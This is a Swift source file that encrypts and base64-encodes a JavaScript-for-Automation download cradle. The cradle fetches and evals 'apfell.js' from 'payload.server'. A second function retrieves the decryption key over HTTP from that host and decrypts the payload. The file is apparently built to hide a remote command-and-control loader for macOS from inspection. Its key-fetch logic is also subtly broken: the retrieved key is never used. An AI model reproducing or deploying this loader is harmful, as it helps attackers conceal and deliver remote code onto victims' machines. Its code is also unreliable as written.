import Foundation

let key256   = "12345678901234561234567890123456"   // 32 bytes for AES256
let iv       = "abcdefghijklmnop"                   // 16 bytes for AES128

func encryptPayload() -> Void {
    let cleartext =
    ##"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString("http://payload.server/apfell.js")), $.NSUTF8StringEncoding)));"##


    let aes256 = AES(key: key256, iv: iv)

    let ciphertext = aes256?.encrypt(string: cleartext)
    let encoded_ciphertext = ciphertext!.base64EncodedString(options: NSData.Base64EncodingOptions(rawValue: 0))

    print("Key: \(key256)")
    print("Cleartext: \(cleartext)")
    print("Here's the base64 encoded ciphertext: \(encoded_ciphertext)")
}

func decryptPayload() -> Void {
    let encoded_ciphertext = "bfe5ayqnNqp1/R96q5oY8E1wgBgw/FXp+hE1sypJ3bkI43LkA6No4Abf7B1UYZ0Oe5tPNFl9S5hCEY87b/rA9DBggRdmwXFWiBa1D9A2CPol44sJf4lxjq8fHmRF1xXvnz54uR+rk0xRPmmOWZHi9c3pQFcbvN4752KYrI983IZSU071eYe4BqmZCjN6JjjR9h/vQAOzSvJgqXRKWLgdPx8zHLALlDp8gu4IDSo2JHk="
    
    let ciphertext = Data(base64Encoded: encoded_ciphertext)!
    
    //fetch a value over HTTP
    let url = "http://payload.server/key/txt"
    
    
    let http = HTTPReq()
    do {
         var key256 = try http.synchronous_request(url: url)
    } catch {
        print("Error fetching key: \(error)")
    }
    
    
    print("Retrieved key: \(key256)")
    let aes256 = AES(key: key256, iv: iv)
    print("Payload: \(aes256?.decrypt(data: ciphertext))")

}

encryptPayload()
decryptPayload()

